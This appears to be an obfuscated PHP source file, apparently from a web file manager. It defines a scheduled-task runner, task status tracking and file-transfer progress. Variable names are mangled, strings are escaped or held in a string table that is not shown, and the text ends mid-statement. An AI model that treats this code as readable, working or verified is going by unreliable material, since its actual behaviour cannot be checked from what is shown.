<?php
 goto c©õÈ´¢Ÿ³; bÃª¨Èµ×Ë: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ ¾›¸µ =& $_SERVER[³Ôà×Ó]; if (self::valueGet($ ¾›¸µ[825]) != $ ¾›¸µ[91]) { return; } if (self::valueGet($ ¾›¸µ[1715]) == $ ¾›¸µ[91]) { $ŒÒ¾Œ¾ = self::valueGet($ ¾›¸µ[1716]); if (time() - $ŒÒ¾Œ¾ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ ¾›¸µ[1715], $ ¾›¸µ[91]); self::log($ ¾›¸µ[1717] . ACTION . $ ¾›¸µ[1718]); Hook::bind($ ¾›¸µ[1719], $ ¾›¸µ[1720]); $Ó»ëä·³ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ ¾›¸µ[825]) != $ ¾›¸µ[91]) { self::valueSet($ ¾›¸µ[1715], $ ¾›¸µ[228]); self::log($ ¾›¸µ[1721]); die; } $’©õóÊ = time(); if ($’©õóÊ - $Ó»ëä·³ >= 60) { self::valueSet(array($ ¾›¸µ[1715] => $ ¾›¸µ[91], $ ¾›¸µ[1716] => $’©õóÊ)); $Ó»ëä·³ = $’©õóÊ; } if (!file_exists(USER_SYSTEM . $ ¾›¸µ[1722])) { self::valueSet(array($ ¾›¸µ[1715] => $ ¾›¸µ[228], $ ¾›¸µ[825] => $ ¾›¸µ[228])); self::log($ ¾›¸µ[1723]); die; } $ÉŒ•ö‹é = file_get_contents(BASIC_PATH . $ ¾›¸µ[1724]); $« ÷ç¬ = KOD_VERSION . $ ¾›¸µ[10] . KOD_VERSION_BUILD; $¯Ëµ€ûö = match_text($ÉŒ•ö‹é, $ ¾›¸µ[1725]) . $ ¾›¸µ[10] . match_text($ÉŒ•ö‹é, $ ¾›¸µ[1726]); if ($¯Ëµ€ûö != $« ÷ç¬) { self::restart(); self::log("\x73\164\x6f\x70\145\x64\56\x5b\x76\x65\162\x73\x69\157\156\x20\165\x70\144\141\164\x65\x3b{$versionNow}\40\75\x3e\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $î¼ŸÖÇõ =& $_SERVER[³Ôà×Ó]; http_close(); $GLOBALS[$î¼ŸÖÇõ[1727]] = 1; $_SERVER[$î¼ŸÖÇõ[1728]] = $î¼ŸÖÇõ[1729]; $_COOKIE = array(); $GLOBALS[$î¼ŸÖÇõ[1730]] = 1; $GLOBALS[$î¼ŸÖÇõ[1731]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $£½ƒ•Ğô =& $_SERVER[³Ôà×Ó]; http_close(); self::valueSet($£½ƒ•Ğô[825], $£½ƒ•Ğô[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($£½ƒ•Ğô[1715] => $£½ƒ•Ğô[228], $£½ƒ•Ğô[825] => $£½ƒ•Ğô[91])); self::log($£½ƒ•Ğô[1732]); } public static function taskSwitch() { $¸õçƒäç =& $_SERVER[³Ôà×Ó]; $¶˜¬ü™¸ = self::valueGet($¸õçƒäç[825]) == $¸õçƒäç[91] ? $¸õçƒäç[228] : $¸õçƒäç[91]; self::valueSet($¸õçƒäç[825], $¶˜¬ü™¸); } public static function shutdownEvent() { $äÃÆò÷ =& $_SERVER[³Ôà×Ó]; self::valueSet($äÃÆò÷[1715], $äÃÆò÷[228]); self::log($äÃÆò÷[1733]); } public static function config($Ö¶£ËÅœ, $´¸ÔƒÛİ) { self::valueSet($_SERVER[³Ôà×Ó][825], $Ö¶£ËÅœ); } private static function taskRunAll() { $ù”´Õò =& $_SERVER[³Ôà×Ó]; $‡ÃİÍÑÚ = timeFloat(); $İ‹î¿‹Ï = Model($ù”´Õò[1734])->listData(); $Î½ÉÒäÇ = count($İ‹î¿‹Ï); for ($ØÇšÓ£œ = 0; $ØÇšÓ£œ < $Î½ÉÒäÇ; $ØÇšÓ£œ++) { $áÖ±—Ø– = $İ‹î¿‹Ï[$ØÇšÓ£œ]; if (!$áÖ±—Ø–[$ù”´Õò[484]] || $áÖ±—Ø–[$ù”´Õò[1735]] != $ù”´Õò[91]) { continue; } if (!self::taskTimeCheck($áÖ±—Ø–)) { continue; } self::taskRun($áÖ±—Ø–); } Hook::trigger($ù”´Õò[1736]); self::taskQueueRun($‡ÃİÍÑÚ); } private static function taskQueueRun($Åê©˜–) { $É€É«œ¯ = 10; while (!0) { $¬µÊà = TaskQueue::run(); if ($¬µÊà === !1) { break; } if (timeFloat() - $Åê©˜– >= $É€É«œ¯) { break; } } } private static function taskTimeCheck($ÁôÈ°Ó ) { $Æ¤¦ÙÕ =& $_SERVER[³Ôà×Ó]; $Ä¼äØ´ã = json_decode($ÁôÈ°Ó [$Æ¤¦ÙÕ[206]], !0); $˜×Úâ‹ = intval($ÁôÈ°Ó [$Æ¤¦ÙÕ[1716]]); $ùÕ”ïèŞ = strtotime($Æ¤¦ÙÕ[1737] . $Ä¼äØ´ã[$Æ¤¦ÙÕ[1738]] . $Æ¤¦ÙÕ[1739]) - strtotime($Æ¤¦ÙÕ[1740]); $À¸³ÛÃ„ = time() - strtotime(date($Æ¤¦ÙÕ[1741]) . $Æ¤¦ÙÕ[1742]); $³ÔÄ÷âĞ = $À¸³ÛÃ„ >= $ùÕ”ïèŞ && $À¸³ÛÃ„ <= $ùÕ”ïèŞ + 3600; switch ($Ä¼äØ´ã[$Æ¤¦ÙÕ[33]]) { case $Æ¤¦ÙÕ[1743]: if (time() - $˜×Úâ‹ < 3600 * 24 * 30) { return !1; } if ($Ä¼äØ´ã[$Æ¤¦ÙÕ[1743]] == date($Æ¤¦ÙÕ[1744]) && $³ÔÄ÷âĞ) { return !0; } break; case $Æ¤¦ÙÕ[1745]: if (time() - $˜×Úâ‹ < 3600 * 24 * 7) { return !1; } $ä°ÖÌÑê = date($Æ¤¦ÙÕ[1746]) == 0 ? 7 : date($Æ¤¦ÙÕ[1746]); if ($Ä¼äØ´ã[$Æ¤¦ÙÕ[1745]] == $ä°ÖÌÑê && $³ÔÄ÷âĞ) { return !0; } break; case $Æ¤¦ÙÕ[1738]: if (time() - $˜×Úâ‹ < 3600 * 24) { return !1; } if ($³ÔÄ÷âĞ) { return !0; } break; case $Æ¤¦ÙÕ[1747]: if (time() - $˜×Úâ‹ >= floatval($Ä¼äØ´ã[$Æ¤¦ÙÕ[1747]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ñ¾×©ïß =& $_SERVER[³Ôà×Ó]; static $éÉÕıÁà = 0; $²Î…ä = 300; if (!$éÉÕıÁà) { $éÉÕıÁà = time(); } if (time() - $éÉÕıÁà < $²Î…ä) { return; } $éÉÕıÁà = time(); $Ş×š•Í¦ = Model($ñ¾×©ïß[586])->db($ñ¾×©ïß[12]); if ($Ş×š•Í¦) { $Ş×š•Í¦->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ñ¾×©ïß[1748], $ñ¾×©ïß[1749]); die; } } public static function taskRun($Ë¾Ò¨Å) { $ÛŠüÑ–Š =& $_SERVER[³Ôà×Ó]; self::log($ÛŠüÑ–Š[1750] . $Ë¾Ò¨Å[$ÛŠüÑ–Š[484]] . $ÛŠüÑ–Š[1751] . $Ë¾Ò¨Å[$ÛŠüÑ–Š[32]] . $ÛŠüÑ–Š[1752] . $Ë¾Ò¨Å[$ÛŠüÑ–Š[1753]]); Model($ÛŠüÑ–Š[1734])->run($Ë¾Ò¨Å[$ÛŠüÑ–Š[484]]); $¯êí‡“ = timeFloat(); $½ŸÈ»Ë = $ÛŠüÑ–Š[12]; switch ($Ë¾Ò¨Å[$ÛŠüÑ–Š[33]]) { case $ÛŠüÑ–Š[383]: $öçºıîØ = url_request($Ë¾Ò¨Å[$ÛŠüÑ–Š[1753]], $ÛŠüÑ–Š[261], !1, !1, !1, !1, 10); if ($öçºıîØ[$ÛŠüÑ–Š[825]]) { $½ŸÈ»Ë = strlen($öçºıîØ[$ÛŠüÑ–Š[1284]]); } break; case $ÛŠüÑ–Š[260]: $½ŸÈ»Ë = Hook::apply($Ë¾Ò¨Å[$ÛŠüÑ–Š[1753]]); default: break; } Model($ÛŠüÑ–Š[1754])->add(array($ÛŠüÑ–Š[1755] => $ÛŠüÑ–Š[12], $ÛŠüÑ–Š[1756] => $ÛŠüÑ–Š[228], $ÛŠüÑ–Š[33] => $ÛŠüÑ–Š[1757] . $Ë¾Ò¨Å[$ÛŠüÑ–Š[484]], $ÛŠüÑ–Š[1758] => json_encode(array($ÛŠüÑ–Š[32] => $Ë¾Ò¨Å[$ÛŠüÑ–Š[32]], $ÛŠüÑ–Š[1759] => timeFloat() - $¯êí‡“, $ÛŠüÑ–Š[369] => $½ŸÈ»Ë)))); $Èê—ÊÙŞ = $½ŸÈ»Ë ? $ÛŠüÑ–Š[1760] . $½ŸÈ»Ë : $ÛŠüÑ–Š[12]; self::log($ÛŠüÑ–Š[1761] . $Ë¾Ò¨Å[$ÛŠüÑ–Š[484]] . $ÛŠüÑ–Š[178] . $Èê—ÊÙŞ); return !0; } public static function valueGet($§ÒÄÜûş) { $¯­ÑçÈª =& $_SERVER[³Ôà×Ó]; $È©‚œ¥ = $¯­ÑçÈª[1762]; $«‚¢è«“ = Model($¯­ÑçÈª[517])->get($§ÒÄÜûş, $È©‚œ¥); if (is_null($«‚¢è«“)) { Model($¯­ÑçÈª[517])->set($¯­ÑçÈª[825], $¯­ÑçÈª[91], $È©‚œ¥); Model($¯­ÑçÈª[517])->set($¯­ÑçÈª[1715], $¯­ÑçÈª[228], $È©‚œ¥); $«‚¢è«“ = Model($¯­ÑçÈª[517])->get($§ÒÄÜûş, $È©‚œ¥); } return $«‚¢è«“; } private static function valueSet($µôÅÂÍ—, $«äğÓ’¤ = false) { $´åØ¹çƒ =& $_SERVER[³Ôà×Ó]; $€Î†Í· = $´åØ¹çƒ[1763]; CacheLock::lock($€Î†Í·); $–ŞëŒµ = Model($´åØ¹çƒ[517])->set($µôÅÂÍ—, $«äğÓ’¤, $´åØ¹çƒ[1762]); CacheLock::unlock($€Î†Í·); return $–ŞëŒµ; } protected static function log($¯©µ»Ï) { write_log($¯©µ»Ï, $_SERVER[³Ôà×Ó][1749]); } private static function cacheClear() { $ó¹¨·ÎŸ =& $_SERVER[³Ôà×Ó]; Cache::clearMemory(Model($ó¹¨·ÎŸ[517])->cacheKey($ó¹¨·ÎŸ[1762])); Cache::clearMemory(Model($ó¹¨·ÎŸ[517])->cacheKey($ó¹¨·ÎŸ[1764])); Model($ó¹¨·ÎŸ[1734])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\x6f\x70"; const STATYS_RUNNING = "\x72\165\x6e\x6e\151\156\x67"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ß¹ç×İ, $´ãÆ± ß = '', $“ÕÒÖë = 0, $³óÃÒ…¯ = '') { $§Ï†øßÒ =& $_SERVER[³Ôà×Ó]; if (self::get($ß¹ç×İ)) { return; } $this->task = array($§Ï†øßÒ[484] => $ß¹ç×İ, $§Ï†øßÒ[1765] => USER_ID, $§Ï†øßÒ[1654] => $³óÃÒ…¯, $§Ï†øßÒ[535] => $§Ï†øßÒ[12], $§Ï†øßÒ[33] => $´ãÆ± ß, $§Ï†øßÒ[1140] => $§Ï†øßÒ[12], $§Ï†øßÒ[1138] => $“ÕÒÖë, $§Ï†øßÒ[1766] => 0, $§Ï†øßÒ[1767] => 0, $§Ï†øßÒ[1768] => 0, $§Ï†øßÒ[1769] => timeFloat(), $§Ï†øßÒ[1770] => 0, $§Ï†øßÒ[1771] => 0, $§Ï†øßÒ[1772] => 0, $§Ï†øßÒ[1773] => 0, $§Ï†øßÒ[825] => $§Ï†øßÒ[1715]); $GLOBALS[$§Ï†øßÒ[1774]] = 1; Hook::bind($§Ï†øßÒ[1719], array($this, $§Ï†øßÒ[1775])); Hook::bind($§Ï†øßÒ[1776], array($this, $§Ï†øßÒ[1777])); $this->startAfter(); Hook::trigger($§Ï†øßÒ[1778], $this->task); $this->task[$§Ï†øßÒ[1771]] = timeFloat(); } public function end($åğŒÀ®æ = '') { $şÊøï =& $_SERVER[³Ôà×Ó]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$şÊøï[1771]]) { self::valueSet($this->task[$şÊøï[484]], !1); } $this->isEnd = !0; if ($åğŒÀ®æ) { $this->task[$şÊøï[535]] = $åğŒÀ®æ; } self::log($şÊøï[1779] . $this->task[$şÊøï[484]] . $şÊøï[1780] . sprintf($şÊøï[925], timeFloat() - $this->task[$şÊøï[1769]]) . $şÊøï[1781]); Hook::unbind($şÊøï[1719], array($this, $şÊøï[1775])); Hook::unbind($şÊøï[1776], array($this, $şÊøï[1777])); $this->endAfter(); $˜µ¦¨Óß = $this->task; $this->task = !1; Hook::trigger($şÊøï[1782], $˜µ¦¨Óß); } public function update($Úòã¶ñÄ = 0, $ËÑ¡ÕƒÛ = false) { $Í¡å¡ª =& $_SERVER[³Ôà×Ó]; $èÏ±ôå× =& $this->task; if (!$èÏ±ôå×) { return; } $èÏ±ôå×[$Í¡å¡ª[1766]] += $Úòã¶ñÄ; $èÏ±ôå×[$Í¡å¡ª[1770]] = timeFloat(); if ($èÏ±ôå×[$Í¡å¡ª[1138]]) { if ($èÏ±ôå×[$Í¡å¡ª[1138]] < $èÏ±ôå×[$Í¡å¡ª[1766]]) { $èÏ±ôå×[$Í¡å¡ª[1138]] = $èÏ±ôå×[$Í¡å¡ª[1766]]; } $û‘±ç‰á = timeFloat() - $èÏ±ôå×[$Í¡å¡ª[1769]] - $èÏ±ôå×[$Í¡å¡ª[1772]]; if ($û‘±ç‰á <= 0) { $û‘±ç‰á = 0.001; } $èÏ±ôå×[$Í¡å¡ª[1767]] = $èÏ±ôå×[$Í¡å¡ª[1766]] / $èÏ±ôå×[$Í¡å¡ª[1138]]; $èÏ±ôå×[$Í¡å¡ª[1768]] = $èÏ±ôå×[$Í¡å¡ª[1766]] / $û‘±ç‰á; if ($èÏ±ôå×[$Í¡å¡ª[1767]] > 0) { $èÏ±ôå×[$Í¡å¡ª[1773]] = $û‘±ç‰á * (1 - $èÏ±ôå×[$Í¡å¡ª[1767]]) / $èÏ±ôå×[$Í¡å¡ª[1767]]; } $èÏ±ôå×[$Í¡å¡ª[1773]] = $èÏ±ôå×[$Í¡å¡ª[1773]] <= 0 ? 0 : $èÏ±ôå×[$Í¡å¡ª[1773]]; } $this->updateAfter(); $©ŞÜ¼ğÁ = 0.2; if (timeFloat() - $èÏ±ôå×[$Í¡å¡ª[1771]] < $©ŞÜ¼ğÁ && !$ËÑ¡ÕƒÛ) { return; } $ëôÄ·Ï = self::get($èÏ±ôå×[$Í¡å¡ª[484]]); $ãÚÃ¢‹À = $ëôÄ·Ï[$Í¡å¡ª[825]]; if ($ãÚÃ¢‹À == self::STATYS_KILL) { $øâû„‡ = array($Í¡å¡ª[1783] => LNG($Í¡å¡ª[1784]), $Í¡å¡ª[1294] => !1); Cache::set($Í¡å¡ª[1785] . $this->task[$Í¡å¡ª[484]], $øâû„‡, 30); $this->onKill(); $this->end(); die; } else { if ($ãÚÃ¢‹À == self::STATYS_STOP) { $‰ï˜†… = 2; $ëôÄ·Ï[$Í¡å¡ª[1772]] += $‰ï˜†…; self::valueSet($èÏ±ôå×[$Í¡å¡ª[484]], $ëôÄ·Ï); sleep($‰ï˜†…); $this->update(); return; } } $èÏ±ôå×[$Í¡å¡ª[825]] = $ãÚÃ¢‹À ? $ãÚÃ¢‹À : $èÏ±ôå×[$Í¡å¡ª[825]]; $èÏ±ôå×[$Í¡å¡ª[1772]] = $ëôÄ·Ï[$Í¡å¡ª[1772]] ? $ëôÄ·Ï[$Í¡å¡ª[1772]] : 0; $èÏ±ôå×[$Í¡å¡ª[1771]] = timeFloat(); Hook::trigger($Í¡å¡ª[1786], $èÏ±ôå×); self::valueSet($èÏ±ôå×[$Í¡å¡ª[484]], $èÏ±ôå×); } public function onKillSet($ÏŞˆ§¬Ô, $ÌÒœİÂ… = array()) { $this->onKillCall = array($ÏŞˆ§¬Ô, $ÌÒœİÂ…); } public function onKill() { $³õõÃ´ü =& $_SERVER[³Ôà×Ó]; self::log($³õõÃ´ü[1779] . $this->task[$³õõÃ´ü[484]] . $³õõÃ´ü[1787]); Hook::trigger($³õõÃ´ü[1788], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ÎöÅøŞì) { $â²¹ ™” =& $_SERVER[³Ôà×Ó]; Cache::set($â²¹ ™”[1785] . $this->task[$â²¹ ™”[484]], $ÎöÅøŞì, 60); return $ÎöÅøŞì; } public static function get($‹‚˜Û°) { $×öç†ŞÜ =& $_SERVER[³Ôà×Ó]; $ãÀ¨Íˆ = self::valueGet($‹‚˜Û°); if (is_array($ãÀ¨Íˆ) && $ãÀ¨Íˆ[$×öç†ŞÜ[1789]]) { $Ù«†Ïƒ‘ = ActionApply($ãÀ¨Íˆ[$×öç†ŞÜ[1789]], array($ãÀ¨Íˆ)); $ãÀ¨Íˆ = is_array($Ù«†Ïƒ‘) ? $Ù«†Ïƒ‘ : $ãÀ¨Íˆ; } return $ãÀ¨Íˆ; } public static function listData() { $•ìéÔìÂ = self::valueGet(); return array_sort_by($•ìéÔìÂ, $_SERVER[³Ôà×Ó][1769], !0); } public static function kill($í×ÁĞò·) { return self::changeStatus($í×ÁĞò·, self::STATYS_KILL); } public static function stop($…ªÉ§øÀ) { return self::changeStatus($…ªÉ§øÀ, self::STATYS_STOP); } public static function restart($ğªÜ¢­) { return self::changeStatus($ğªÜ¢­, self::STATYS_RUNNING); } public static function killAll() { $… Ü‡”¢ =& $_SERVER[³Ôà×Ó]; $€ Ü‚ñÃ = self::listData(); foreach ($€ Ü‚ñÃ as $±ğÏ–ÓØ) { self::kill($±ğÏ–ÓØ[$… Ü‡”¢[484]]); } sleep(2); foreach ($€ Ü‚ñÃ as $±ğÏ–ÓØ) { self::valueSet($±ğÏ–ÓØ[$… Ü‡”¢[484]], !1); } } private static function changeStatus($òÁ˜ıÇ, $ç’ÂÄ) { $Û¹à–  =& $_SERVER[³Ôà×Ó]; $»šµ¤…¿ = self::valueGet($òÁ˜ıÇ); if (!$»šµ¤…¿) { return !1; } $»šµ¤…¿[$Û¹à– [825]] = $ç’ÂÄ; self::valueSet($òÁ˜ıÇ, $»šµ¤…¿); self::log($Û¹à– [1790] . $»šµ¤…¿[$Û¹à– [484]] . $Û¹à– [1791] . $ç’ÂÄ); return !0; } public static function valueGet($åÂ¥ÌÖ¦ = false) { $œ˜ÔÚîÜ =& $_SERVER[³Ôà×Ó]; if ($åÂ¥ÌÖ¦) { $£ää«şˆ = Model($œ˜ÔÚîÜ[529])->where(array($œ˜ÔÚîÜ[97] => $åÂ¥ÌÖ¦, $œ˜ÔÚîÜ[33] => $œ˜ÔÚîÜ[1147]))->find(); return $£ää«şˆ ? json_decode($£ää«şˆ[$œ˜ÔÚîÜ[459]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($­º‡Ì„ = false) { $Œ–»‡­ï =& $_SERVER[³Ôà×Ó]; $ªç©¦üØ = array($Œ–»‡­ï[33] => $Œ–»‡­ï[1147]); if ($­º‡Ì„) { $ªç©¦üØ[$Œ–»‡­ï[1765]] = $­º‡Ì„; } $ù¦¾„Ë‡ = Model($Œ–»‡­ï[529])->where($ªç©¦üØ)->select(); $ù¦¾„Ë‡ = $ù¦¾„Ë‡ ? $ù¦¾„Ë‡ : array(); foreach ($ù¦¾„Ë‡ as $­õËÉà¤ => $ùß“”éø) { $ù¦¾„Ë‡[$­õËÉà¤] = json_decode($ùß“”éø[$Œ–»‡­ï[459]], !0); } return $ù¦¾„Ë‡; } public static function valueSet($ª¾‹ñ™×, $•èğŸ–¶) { $£Æ·Àù” =& $_SERVER[³Ôà×Ó]; if (!$•èğŸ–¶) { return Model($£Æ·Àù”[529])->where(array($£Æ·Àù”[97] => $ª¾‹ñ™×, $£Æ·Àù”[33] => $£Æ·Àù”[1147]))->delete(); } $Ù‘¦™” = json_encode($•èğŸ–¶); if (!$Ù‘¦™”) { ob_start(); var_dump($•èğŸ–¶); $±àÅĞ÷Ş = ob_get_clean(); self::log($£Æ·Àù”[1792] . json_encode_force($±àÅĞ÷Ş)); } if (!$ª¾‹ñ™× || !$•èğŸ–¶[$£Æ·Àù”[484]]) { return !1; } $‚î×Ûç‡ = array($£Æ·Àù”[33] => $£Æ·Àù”[1147], $£Æ·Àù”[1765] => USER_ID, $£Æ·Àù”[97] => $ª¾‹ñ™×, $£Æ·Àù”[459] => $Ù‘¦™”); $†Š‰×ßÉ = $£Æ·Àù”[1793]; CacheLock::lock($†Š‰×ßÉ); Model($£Æ·Àù”[529])->add($‚î×Ûç‡, array(), !0); CacheLock::unlock($†Š‰×ßÉ); } public static function log($ÊÙãÒ¸) { if (!GLOBAL_DEBUG) { return; } write_log($ÊÙãÒ¸, $_SERVER[³Ôà×Ó][1794]); } } class TaskFileTransfer extends Task { protected function startAfter() { $¤€Û•ÛÏ =& $_SERVER[³Ôà×Ó]; $Š÷ÉŒ®ı =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¤€Û•ÛÏ[1795], array($this, $¤€Û•ÛÏ[1796])); Hook::bind($¤€Û•ÛÏ[1305], array($this, $¤€Û•ÛÏ[1797])); Hook::bind($¤€Û•ÛÏ[1798], array($this, $¤€Û•ÛÏ[1799])); Hook::bind($¤€Û•ÛÏ[677], array($this, $¤€Û•ÛÏ[1800])); Hook::bind($¤€Û•ÛÏ[678], array($this, $¤€Û•ÛÏ[1801])); Hook::bind($¤€Û•ÛÏ[684], array($this, $¤€Û•ÛÏ[1802])); Hook::bind($¤€Û•ÛÏ[685], array($this, $¤€Û•ÛÏ[1803])); Hook::bind($¤€Û•ÛÏ[680], array($this, $¤€Û•ÛÏ[1804])); Hook::bind($¤€Û•ÛÏ[682], array($this, $¤€Û•ÛÏ[1805])); Hook::bind($¤€Û•ÛÏ[646], array($this, $¤€Û•ÛÏ[1806])); Hook::bind($¤€Û•ÛÏ[643], array($this, $¤€Û•ÛÏ[1806])); Hook::bind($¤€Û•ÛÏ[648], array($this, $¤€Û•ÛÏ[1806])); Hook::bind($¤€Û•ÛÏ[650], array($this, $¤€Û•ÛÏ[1806])); Hook::bind($¤€Û•ÛÏ[652], array($this, $¤€Û•ÛÏ[1806])); Hook::bind($¤€Û•ÛÏ[1807], array($this, $¤€Û•ÛÏ[1808])); Hook::bind($¤€Û•ÛÏ[668], array($this, $¤€Û•ÛÏ[1809])); $this->sourceModelCopyFlag = !1; Hook::bind($¤€Û•ÛÏ[1810], array($this, $¤€Û•ÛÏ[1811])); Hook::bind($¤€Û•ÛÏ[1812], array($this, $¤€Û•ÛÏ[1813])); Hook::bind($¤€Û•ÛÏ[1814], array($this, $¤€Û•ÛÏ[1815])); $Š÷ÉŒ®ı[$¤€Û•ÛÏ[1816]] = LNG($¤€Û•ÛÏ[1817]); $Š÷ÉŒ®ı[$¤€Û•ÛÏ[1818]] = 0; $Š÷ÉŒ®ı[$¤€Û•ÛÏ[1819]] = 0; $Š÷ÉŒ®ı[$¤€Û•ÛÏ[1140]] = $¤€Û•ÛÏ[12]; $Š÷ÉŒ®ı[$¤€Û•ÛÏ[1820]] = $¤€Û•ÛÏ[12]; $Š÷ÉŒ®ı[$¤€Û•ÛÏ[1821]] = 0; $Š÷ÉŒ®ı[$¤€Û•ÛÏ[1822]] = 0; $Š÷ÉŒ®ı[$¤€Û•ÛÏ[1823]] = 0; if (!$Š÷ÉŒ®ı[$¤€Û•ÛÏ[1654]]) { $Š÷ÉŒ®ı[$¤€Û•ÛÏ[1654]] = LNG($¤€Û•ÛÏ[1824]); } } protected function endAfter() { $‚ô¸øàÂ =& $_SERVER[³Ôà×Ó]; Hook::unbind($‚ô¸øàÂ[1795], array($this, $‚ô¸øàÂ[1796])); Hook::unbind($‚ô¸øàÂ[1305], array($this, $‚ô¸øàÂ[1797])); Hook::unbind($‚ô¸øàÂ[1798], array($this, $‚ô¸øàÂ[1799])); Hook::unbind($‚ô¸øàÂ[677], array($this, $‚ô¸øàÂ[1800])); Hook::unbind($‚ô¸øàÂ[678], array($this, $‚ô¸øàÂ[1801])); Hook::unbind($‚ô¸øàÂ[684], array($this, $‚ô¸øàÂ[1802])); Hook::unbind($‚ô¸øàÂ[685], array($this, $‚ô¸øàÂ[1803])); Hook::unbind($‚ô¸øàÂ[680], array($this, $‚ô¸øàÂ[1804])); Hook::unbind($‚ô¸øàÂ[682], array($this, $‚ô¸øàÂ[1805])); Hook::unbind($‚ô¸øàÂ[646], array($this, $‚ô¸øàÂ[1806])); Hook::unbind($‚ô¸øàÂ[643], array($this, $‚ô¸øàÂ[1806])); Hook::unbind($‚ô¸øàÂ[648], array($this, $‚ô¸øàÂ[1806])); Hook::unbind($‚ô¸øàÂ[650], array($this, $‚ô¸øàÂ[1806])); Hook::unbind($‚ô¸øàÂ[652], array($this, $‚ô¸øàÂ[1806])); Hook::unbind($‚ô¸øàÂ[1807], array($this, $‚ô¸øàÂ[1808])); Hook::unbind($‚ô¸øàÂ[668], array($this, $‚ô¸øàÂ[1809])); Hook::unbind($‚ô¸øàÂ[1810], array($this, $‚ô¸øàÂ[1811])); Hook::unbind($‚ô¸øàÂ[1812], array($this, $‚ô¸øàÂ[1813])); Hook::unbind($‚ô¸øàÂ[1814], array($this, $‚ô¸øàÂ[1815])); } public function copyMoveStart($Ò­àû£¸, $‚òŸúš, $èù—òÈİ, $Äê×Æ) { $—âÌ»Êà =& $_SERVER[³Ôà×Ó]; self::log($—âÌ»Êà[1825] . $‚òŸúš . $—âÌ»Êà[73] . $Äê×Æ); $«İ»×Ö‘ = rtrim(TEMP_FILES, $—âÌ»Êà[8]); if (substr($‚òŸúš, 0, strlen($«İ»×Ö‘)) == $«İ»×Ö‘) { return; } if (substr($Äê×Æ, 0, strlen($«İ»×Ö‘)) == $«İ»×Ö‘) { return; } $ÌÃİÌ™´ =& $this->task; $ÌÃİÌ™´[$—âÌ»Êà[1826]] = KodIO::transferType($Ò­àû£¸, $èù—òÈİ); $this->update(); } public function updateAfter() { $—ïå «… =& $_SERVER[³Ôà×Ó]; $ŸïÂ’ÄÆ =& $this->task; if (!$ŸïÂ’ÄÆ[$—ïå «…[838]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ŸïÂ’ÄÆ[$—ïå «…[1826]] == $—ïå «…[1398]) { return; } self::updateTask($ŸïÂ’ÄÆ); } private static function updateTask(&$²ñÚ¨”Ä) { $ƒÙß…®“ =& $_SERVER[³Ôà×Ó]; if ($²ñÚ¨”Ä[$ƒÙß…®“[1826]] == $ƒÙß…®“[1276] || $²ñÚ¨”Ä[$ƒÙß…®“[1826]] == $ƒÙß…®“[110]) { if ($²ñÚ¨”Ä[$ƒÙß…®“[1820]]) { $²ñÚ¨”Ä[$ƒÙß…®“[1823]] = $²ñÚ¨”Ä[$ƒÙß…®“[1822]] + $²ñÚ¨”Ä[$ƒÙß…®“[1819]]; } } else { if ($²ñÚ¨”Ä[$ƒÙß…®“[1826]] == $ƒÙß…®“[1399]) { if ($²ñÚ¨”Ä[$ƒÙß…®“[1820]] == $ƒÙß…®“[1276]) { $²ñÚ¨”Ä[$ƒÙß…®“[1823]] = $²ñÚ¨”Ä[$ƒÙß…®“[1822]] + $²ñÚ¨”Ä[$ƒÙß…®“[1819]] * 0.5; } else { if ($²ñÚ¨”Ä[$ƒÙß…®“[1820]] == $ƒÙß…®“[110]) { $²ñÚ¨”Ä[$ƒÙß…®“[1823]] = $²ñÚ¨”Ä[$ƒÙß…®“[1822]] + $²ñÚ¨”Ä[$ƒÙß…®“[1818]] * 0.5 + $²ñÚ¨”Ä[$ƒÙß…®“[1819]] * 0.5; } } } } $²ñÚ¨”Ä[$ƒÙß…®“[1767]] = $²ñÚ¨”Ä[$ƒÙß…®“[1823]] / $²ñÚ¨”Ä[$ƒÙß…®“[838]]; if ($²ñÚ¨”Ä[$ƒÙß…®“[1767]] > 0) { $º¿´â™ = timeFloat() - $²ñÚ¨”Ä[$ƒÙß…®“[1769]] - $²ñÚ¨”Ä[$ƒÙß…®“[1772]]; $²ñÚ¨”Ä[$ƒÙß…®“[1773]] = $º¿´â™ * (1 - $²ñÚ¨”Ä[$ƒÙß…®“[1767]]) / $²ñÚ¨”Ä[$ƒÙß…®“[1767]]; } } public function addPath($ßµÂ³ô) { $õçÅ¶çÌ =& $_SERVER[³Ôà×Ó]; if (!$ßµÂ³ô) { return; } $å­¼÷©ï =& $this->task; $†Š…Âæú = IO::infoWithChildren($ßµÂ³ô); $÷áğ€Ää = $å­¼÷©ï[$õçÅ¶çÌ[1827]] ? $å­¼÷©ï[$õçÅ¶çÌ[1827]][$õçÅ¶çÌ[1828]] : 0; $å­¼÷©ï[$õçÅ¶çÌ[1827]] = array($õçÅ¶çÌ[1828] => $÷áğ€Ää + 1, $õçÅ¶çÌ[503] => $†Š…Âæú[$õçÅ¶çÌ[32]], $õçÅ¶çÌ[87] => $†Š…Âæú[$õçÅ¶çÌ[87]], $õçÅ¶çÌ[591] => $†Š…Âæú[$õçÅ¶çÌ[591]] ? $†Š…Âæú[$õçÅ¶çÌ[591]] : $†Š…Âæú[$õçÅ¶çÌ[87]]); if ($†Š…Âæú[$õçÅ¶çÌ[33]] == $õçÅ¶çÌ[230]) { 